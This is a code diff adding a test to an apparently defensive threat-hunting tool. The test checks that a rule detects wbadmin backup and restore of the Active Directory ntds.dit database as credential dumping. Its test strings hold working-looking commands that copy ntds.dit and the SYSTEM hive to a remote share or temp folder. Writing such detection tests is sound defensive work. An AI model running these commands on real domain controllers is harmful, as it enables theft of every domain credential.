@@ -150,3 +150,21 @@ def test_failures_slightly_out_of_order_still_count_as_one_window(tmp_path):
     seconds = [0, 0, 4, 4, 0]
     result = hunt_lines(tmp_path, [access("/dashboard/", 401, second=s, ip="10.0.0.2") for s in seconds])
     assert "auth-brute-force" in rule_ids(result)
+
+
+# 6. ntds.dit through Windows Server Backup (The DFIR Report on Akira, Jun 2026): the one step the
+#    2026 ransomware replay missed. Backing up or restoring the AD database by name is a dump.
+def test_wbadmin_backup_or_restore_of_ntds_dit_is_a_credential_dump(tmp_path):
+    ntds = RULES.rules["cmd-ntds-dump"]
+    assert ntds.search("wbadmin start backup -backupTarget:\\\\10.0.0.9\\b "
+                       "-include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet")
+    assert ntds.search("wbadmin.exe start recovery -version:11/09/2026-03:13 -itemType:File "
+                       "-items:C:\\Windows\\NTDS\\ntds.dit -recoveryTarget:C:\\Temp -quiet")
+    assert not ntds.search("wbadmin start systemstatebackup -backupTarget:E: -quiet")    # routine DC backup
+    assert not ntds.search("wbadmin get versions -backupTarget:E:")
+    result = hunt_events(tmp_path, [{
+        "EventID": 4688, "ProviderName": SECURITY, "Channel": "Security", "Computer": "DC01",
+        "TimeCreated": "2026-11-09T03:13:00Z", "SubjectUserName": "svc_backup",
+        "NewProcessName": "C:\\Windows\\System32\\wbadmin.exe",
+        "CommandLine": "wbadmin start backup -backupTarget:\\\\10.0.0.9\\b -include:C:\\Windows\\NTDS\\ntds.dit -quiet"}])
+    assert "cmd-ntds-dump" in rule_ids(result)
